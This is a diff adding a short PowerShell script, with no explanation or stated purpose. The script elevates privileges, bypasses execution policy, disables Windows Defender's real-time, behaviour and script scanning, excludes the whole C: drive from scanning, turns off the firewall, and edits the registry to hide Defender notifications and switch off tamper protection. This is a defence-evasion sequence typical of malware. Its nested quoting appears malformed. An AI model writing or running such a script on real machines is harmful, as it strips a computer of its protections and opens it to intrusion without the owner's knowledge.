@@ -1,0 +1,18 @@
+Start-Process powershell -Verb runAs -ArgumentList "-NoP -Ep Bypass -Command " 
+
+    Set-MpPreference -DisableRealtimeMonitoring $true;
+    Set-MpPreference -DisableBehaviorMonitoring $true;
+    Set-MpPreference -DisableIOAVProtection $true;
+    Set-MpPreference -DisablePrivacyMode $true;  
+    Set-MpPreference -DisableScriptScanning $true;
+    Add-MpPreference -ExclusionPath 'C:\';
+
+
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
+
+
+    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f;
+
+  
+    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f;
+""
